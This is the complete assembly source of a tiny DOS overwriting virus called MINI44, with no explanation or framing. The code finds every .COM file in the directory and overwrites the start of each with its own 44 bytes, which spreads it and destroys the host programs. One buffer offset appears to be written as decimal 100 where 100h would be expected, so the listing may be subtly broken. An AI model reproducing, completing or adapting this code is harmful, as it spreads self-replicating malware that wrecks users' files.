.model tiny 
.code
FNAME EQU 9Eh 
org 100h

MINI44:
	mov AH, 4Eh ; SEARCH FIRST
	mov DX, offset COMP_FILE
	int 21h
SEARCH_LOOP: 
	jc DONE

	mov AX, 3D01h  ; OPEN FILE
	mov DX, FNAME  ; mov DX, 9Eh
	int 21h
	
	xchg AX, BX
	
	mov AH, 40h  ; WRITE myself as virus
	mov CL, 44
	mov DX, 100
	int 21h
	
	mov AH, 3Eh  ; CLOSE FILE
	int 21h

	mov AH, 4Fh ; SEARCH NEXT
	int 21h

	jmp SEARCH_LOOP 

DONE: 
	ret

COMP_FILE db '*.COM', 0

FINISH:
end MINI44